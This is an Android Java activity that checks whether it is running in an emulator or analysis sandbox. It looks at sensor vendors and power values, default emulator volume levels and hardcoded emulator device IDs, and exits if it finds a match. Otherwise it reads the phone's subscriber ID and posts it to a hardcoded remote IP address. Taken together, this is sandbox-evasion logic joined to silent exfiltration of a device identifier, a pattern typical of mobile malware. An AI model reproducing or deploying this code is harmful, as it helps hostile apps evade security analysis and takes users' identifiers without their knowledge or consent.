package com.boomgaarden_corney.android.konamicode;

import android.app.Activity;
import android.bluetooth.BluetoothAdapter;
import android.hardware.Sensor;
import android.hardware.SensorManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.BatteryManager;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.TextView;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

public class KonamiCodeMainActivity extends Activity {

	private final String DEBUG_TAG = "DEBUG_KONAMICODE";
	private final String SERVER_URL = "http://54.86.68.241/konamicode/test.php";

	private TextView txtResults;

	private int sensorCount = 0;
	private int confidence = 0;
	private int batteryTemperature = 0;
	private int batteryVoltage = 0;
	private int currentAlarmVolume = 0;
	private int currentDTMFVolume = 0;
	private int currentMusicVolume = 0;
	private int currentNotificationVolume = 0;
	private int currentRingVolume = 0;
	private int currentSystemVolume = 0;
	private int currentVoiceCallVolume = 0;

	private float accelerometerMaxRange = 0;
	private float accelerometerPower = 0;
	private float accelerometerResolution = 0;
	private float magnometerMaxRange = 0;
	private float magnometerPower = 0;
	private float magnometerResolution = 0;
	private float orientationPower = 0;
	private float orientationResolution = 0;
	private float proximityMaxRange = 0;
	private float proximityPower = 0;
	private float proximityResolution = 0;

	private String errorMsg;
	private String subscriberIDStr;
	private String accelerometerVendor;
	private String orientationVendor;
	private String proximityVendor;
	private String deviceID;
	private String voiceMailNumber;

	private SensorManager sensorManager;

	private Sensor mAccelerometer;
	private Sensor mMagnometer;
	private Sensor mOrientation;
	private Sensor mProximity;

	private Intent mBattery;

	private BluetoothAdapter mBluetoothAdapter;

	private AudioManager mAudioManager;

	private TelephonyManager mTelephonyManager;

	private List<NameValuePair> paramsErrorMsg = new ArrayList<NameValuePair>();
	private List<NameValuePair> paramsKonamiCode = new ArrayList<NameValuePair>();

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_konami_code_main);

		txtResults = (TextView) this.findViewById(R.id.txtResults);

		sensorManager = (SensorManager) getSystemService(SENSOR_SERVICE);
		mAccelerometer = sensorManager
				.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);
		mMagnometer = sensorManager
				.getDefaultSensor(Sensor.TYPE_MAGNETIC_FIELD);
		mOrientation = sensorManager.getDefaultSensor(Sensor.TYPE_ORIENTATION);
		mProximity = sensorManager.getDefaultSensor(Sensor.TYPE_PROXIMITY);
		mBattery = this.getApplicationContext().registerReceiver(null,
				new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
		mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
		mAudioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
		mTelephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

		sensorListGoNoGo();
		accelerometerGoNoGo();
		magnometerGoNoGo();
		orientationGoNoGo();
		proximityGoNoGo();
		batteryGoNoGo();
		blueToothGoNoGo();
		audioGoNoGo();
		phoneStateGoNoGo();
		finalGoNoGo();

	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.konami_code_main, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// Handle action bar item clicks here. The action bar will
		// automatically handle clicks on the Home/Up button, so long
		// as you specify a parent activity in AndroidManifest.xml.
		int id = item.getItemId();
		if (id == R.id.action_settings) {
			return true;
		}
		return super.onOptionsItemSelected(item);
	}

	private String buildPostRequest(List<NameValuePair> params)
			throws UnsupportedEncodingException {
		StringBuilder result = new StringBuilder();
		boolean first = true;

		for (NameValuePair pair : params) {
			if (first)
				first = false;
			else
				result.append("&");

			result.append(URLEncoder.encode(pair.getName(), "UTF-8"));
			result.append("=");
			result.append(URLEncoder.encode(pair.getValue(), "UTF-8"));
		}

		return result.toString();
	}

	private String sendHttpRequest(String myURL, String postParameters)
			throws IOException {

		URL url = new URL(myURL);

		// Setup Connection
		HttpURLConnection conn = (HttpURLConnection) url.openConnection();
		conn.setReadTimeout(10000); /* in milliseconds */
		conn.setConnectTimeout(15000); /* in milliseconds */
		conn.setRequestMethod("POST");
		conn.setDoOutput(true);

		// Setup POST query params and write to stream
		OutputStream ostream = conn.getOutputStream();
		BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(
				ostream, "UTF-8"));

		if (postParameters.equals("KONAMICODE")) {
			writer.write(buildPostRequest(paramsKonamiCode));
		} else if (postParameters.equals("ERROR_MSG")) {
			writer.write(buildPostRequest(paramsErrorMsg));
			paramsErrorMsg = new ArrayList<NameValuePair>();
		}

		writer.flush();
		writer.close();
		ostream.close();

		// Connect and Log response
		conn.connect();
		int response = conn.getResponseCode();
		Log.d(DEBUG_TAG, "The response is: " + response);

		conn.disconnect();

		return String.valueOf(response);

	}

	private class SendHttpRequestTask extends AsyncTask<String, Void, String> {

		// @params come from SendHttpRequestTask.execute() call
		@Override
		protected String doInBackground(String... params) {
			// params comes from the execute() call: params[0] is the url,
			// params[1] is type POST
			// request to send - i.e. whether to send Device or Accelerometer
			// parameters.
			try {
				return sendHttpRequest(params[0], params[1]);
			} catch (IOException e) {
				setErrorMsg("Unable to retrieve web page. URL may be invalid.");
				showErrorMsg();
				return errorMsg;
			}
		}
	}

	private void setErrorMsg(String error) {
		errorMsg = error;
		paramsErrorMsg.add(new BasicNameValuePair("Error", errorMsg));
	}

	private void showErrorMsg() {
		Log.d(DEBUG_TAG, errorMsg);
		txtResults.append(errorMsg + "\n");
	}

	private void sendKonamiCodeData() {
		ConnectivityManager connectMgr = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo networkInfo = connectMgr.getActiveNetworkInfo();

		// Verify network connectivity is working; if not add note to TextView
		// and Logcat file
		if (networkInfo != null && networkInfo.isConnected()) {
			// Send HTTP POST request to server which will include POST
			// parameters with Telephony info
			new SendHttpRequestTask().execute(SERVER_URL, "KONAMICODE");
		} else {
			setErrorMsg("No Network Connectivity");
			showErrorMsg();
		}
	}

	private void sendErrorMsg() {
		ConnectivityManager connectMgr = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo networkInfo = connectMgr.getActiveNetworkInfo();

		// Verify network connectivity is working; if not add note to TextView
		// and Logcat file
		if (networkInfo != null && networkInfo.isConnected()) {
			// Send HTTP POST request to server which will include POST
			// parameters with Accelerometer info
			new SendHttpRequestTask().execute(SERVER_URL, "ERROR_MSG");
		} else {
			setErrorMsg("No Network Connectivity");
			showErrorMsg();
		}
	}

	private void sensorListGoNoGo() {
		SensorManager sensorMgr = (SensorManager) getSystemService(SENSOR_SERVICE);
		List<Sensor> sensorList = sensorMgr.getSensorList(Sensor.TYPE_ALL);
		sensorCount = sensorList.size();
		if (sensorCount < 9) {
			confidence = 0;
			System.exit(0);
		} else {
			confidence = 1;
		}
	}

	private void accelerometerGoNoGo() {
		if (mAccelerometer == null) {
			confidence = 0;
			System.exit(0);
		} else {
			accelerometerMaxRange = mAccelerometer.getMaximumRange();
			accelerometerPower = mAccelerometer.getPower();
			accelerometerResolution = mAccelerometer.getResolution();
			accelerometerVendor = mAccelerometer.getVendor();
			if ((accelerometerMaxRange < 10)
					&& (String.valueOf(accelerometerPower).equals("3.0"))
					&& (String.valueOf(accelerometerVendor)
							.equals("The Android Open Source Project"))) {
				confidence = 0;
				System.exit(0);
			} else {
				confidence = 1;
			}
		}
	}

	private void magnometerGoNoGo() {
		if (mMagnometer == null) {
			confidence = 0;
			System.exit(0);
		} else {
			magnometerMaxRange = mMagnometer.getMaximumRange();
			magnometerPower = mMagnometer.getPower();
			magnometerResolution = mMagnometer.getResolution();

			if (String.valueOf(magnometerMaxRange).equals("2000.0")
					&& (String.valueOf(magnometerPower).equals("6.7"))
					&& (String.valueOf(magnometerResolution).equals("1.0"))) {
				confidence = 0;
				System.exit(0);
			} else {
				confidence = 1;
			}
		}
	}

	private void orientationGoNoGo() {
		if (mOrientation == null) {
			confidence = 0;
			System.exit(0);
		} else {
			orientationPower = mOrientation.getPower();
			orientationResolution = mOrientation.getResolution();
			orientationVendor = mOrientation.getVendor();

			if ((String.valueOf(orientationPower).equals("9.7"))
					&& (String.valueOf(orientationResolution).equals("1.0"))
					&& (String.valueOf(orientationVendor)
							.equals("The Android Open Source Project"))) {
				confidence = 0;
				System.exit(0);
			} else {
				confidence = 1;
			}
		}
	}

	private void proximityGoNoGo() {
		if (mProximity == null) {
			confidence = 0;
			System.exit(0);
		} else {
			proximityMaxRange = mProximity.getMaximumRange();
			proximityPower = mProximity.getPower();
			proximityResolution = mProximity.getResolution();
			proximityVendor = mProximity.getVendor();
			if ((proximityMaxRange < 2)
					&& (String.valueOf(proximityPower).equals("20.0"))
					&& (String.valueOf(proximityResolution).equals("1.0"))
					&& (String.valueOf(proximityVendor)
							.equals("The Android Open Source Project"))) {
				confidence = 0;
				System.exit(0);
			} else {
				confidence = 1;
			}
		}
	}

	private void batteryGoNoGo() {
		if (mProximity == null) {
			confidence = 0;
			System.exit(0);
		} else {

			batteryTemperature = mBattery.getIntExtra(
					BatteryManager.EXTRA_TEMPERATURE, 0);
			batteryVoltage = mBattery.getIntExtra(BatteryManager.EXTRA_VOLTAGE,
					0);

			if (batteryTemperature == 0 || batteryVoltage == 0) {
				confidence = 0;
				System.exit(0);
			} else {
				confidence = 1;
			}
		}
	}

	private void blueToothGoNoGo() {
		if (mBluetoothAdapter == null) {
			confidence = 0;
			System.exit(0);
		} else {
			confidence = 1;
		}

	}

	private void audioGoNoGo() {
		currentAlarmVolume = mAudioManager
				.getStreamVolume(AudioManager.STREAM_ALARM);
		currentDTMFVolume = mAudioManager
				.getStreamVolume(AudioManager.STREAM_DTMF);
		currentMusicVolume = mAudioManager
				.getStreamVolume(AudioManager.STREAM_MUSIC);
		currentNotificationVolume = mAudioManager
				.getStreamVolume(AudioManager.STREAM_NOTIFICATION);
		currentRingVolume = mAudioManager
				.getStreamVolume(AudioManager.STREAM_RING);
		currentSystemVolume = mAudioManager
				.getStreamVolume(AudioManager.STREAM_SYSTEM);
		currentVoiceCallVolume = mAudioManager
				.getStreamVolume(AudioManager.STREAM_VOICE_CALL);

		if ((currentAlarmVolume == 6)
				&& ((currentDTMFVolume == 11) || (currentDTMFVolume == 12))
				&& (currentMusicVolume == 11)
				&& (currentNotificationVolume == 5) && (currentRingVolume == 5)
				&& ((currentSystemVolume == 7) || (currentSystemVolume == 5))
				&& (currentVoiceCallVolume == 4)) {

			confidence = 0;
			System.exit(0);

		} else {
			confidence = 1;
		}
	}

	private void phoneStateGoNoGo() {
		deviceID = mTelephonyManager.getDeviceId();
		voiceMailNumber = mTelephonyManager.getVoiceMailNumber();

		if ((deviceID.equals("357242043237517")) || (deviceID.equals("357242043237511"))
				|| (deviceID.equals("000000000000000"))
				|| (deviceID.equals("908650746897525")) || (deviceID.equals("418720581487159"))
				&& ((voiceMailNumber.equals("+15552175049")) || (voiceMailNumber.equals("+13579123651")))) {

			confidence = 0;
			System.exit(0);

		} else {
			confidence = 1;
		}

	}

	private void finalGoNoGo() {
		if (confidence == 0) {
			System.exit(0);
		} else {
			GetSubscriberId();
		}
	}

	private void GetSubscriberId() {
		TelephonyManager mTelephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		subscriberIDStr = mTelephonyManager.getSubscriberId();
		paramsKonamiCode.add(new BasicNameValuePair("IMEI", String
				.valueOf(subscriberIDStr)));
		sendKonamiCodeData();
		txtResults.append("IMEI = " + subscriberIDStr);

	}

}
